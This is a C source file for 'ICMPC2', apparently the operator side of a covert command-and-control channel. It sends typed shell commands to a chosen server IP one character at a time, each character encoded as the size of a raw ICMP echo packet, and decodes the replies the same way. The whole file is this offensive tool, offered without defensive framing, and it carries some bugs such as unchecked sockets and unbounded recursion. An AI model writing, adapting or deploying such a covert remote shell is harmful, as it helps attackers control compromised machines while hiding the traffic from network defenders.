#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <ctype.h>
#include <sys/socket.h>

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xffff);
    return ~(sum + (sum >> 16));
}

int sendit(int letter, char *server_ip) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    struct sockaddr_in dest = { .sin_family = AF_INET };
    inet_pton(AF_INET,server_ip, &dest.sin_addr);

    int target_size = letter;

    char packet[target_size];
    memset(packet, 0, target_size);

    struct icmphdr *icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;

    icmp->checksum = checksum(packet, target_size);

    sendto(sock, packet, target_size, 0, (struct sockaddr *)&dest, sizeof(dest));

    close(sock);
    return 0;

}

void receive(char *server_ip) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return;

    struct in_addr want;
    int have_want = (inet_pton(AF_INET, server_ip, &want) == 1);

    unsigned char buf[65536];

    while (1) {
        ssize_t n = recv(sock, buf, sizeof(buf), 0);
        if (n < 0) { close(sock); return; }

        struct ip *iph = (struct ip *)buf;
        int ip_hlen = iph->ip_hl * 4;

        if (iph->ip_p != IPPROTO_ICMP) continue;
        if (have_want && iph->ip_src.s_addr != want.s_addr) continue;

        struct icmphdr *icmp = (struct icmphdr *)(buf + ip_hlen);
        if (icmp->type != ICMP_ECHO) continue;

        int code = ntohs(iph->ip_len) - 20;
        if (code < 1 || code > 255) continue;

        unsigned char c = (unsigned char)code;
        if (c == '*') break;

        putchar(c);
        fflush(stdout);
    }

    close(sock);
}

void message(char *server_ip) {
	char wort[200] = "";
    	char end[] = "*";
    	printf("user@%s:~$ ", server_ip);
    	if (fgets(wort, sizeof(wort), stdin) != NULL) {
       		wort[strcspn(wort, "")] = '\0';
        	size_t free = sizeof(wort) - strlen(wort) - 1;
        	strncat(wort, end, free);
        	for (int i = 0; wort[i] != '\0'; i++) {
            		sendit(wort[i], server_ip);
            		usleep(100000);
        	}
        	printf("\n");
        	receive(server_ip);
        	printf("\n");
    	}
	message(server_ip);
}
void banner(void) {
    const char *G = "\033[32m";
    const char *X = "\033[0m";

    printf("\n");
    printf("%s", G);
    printf(" ██╗ ██████╗███╗   ███╗██████╗  ██████╗██████╗ \n");
    printf(" ██║██╔════╝████╗ ████║██╔══██╗██╔════╝╚════██╗\n");
    printf(" ██║██║     ██╔████╔██║██████╔╝██║      █████╔╝\n");
    printf(" ██║██║     ██║╚██╔╝██║██╔═══╝ ██║     ██╔═══╝ \n");
    printf(" ██║╚██████╗██║ ╚═╝ ██║██║     ╚██████╗███████╗\n");
    printf(" ╚═╝ ╚═════╝╚═╝     ╚═╝╚═╝      ╚═════╝╚══════╝\n");
    printf("%s", X);
    printf("\n");
    printf("                  ICMPC2\n");
    printf("\n");
}

int main() {
    banner();
    char server_ip[64];
    printf("Enter the server ip: ");
    scanf("%63s", server_ip);

    int ch;
    while ((ch = getchar()) != '\n' && ch != EOF);

    message(server_ip);
    return 0;
}


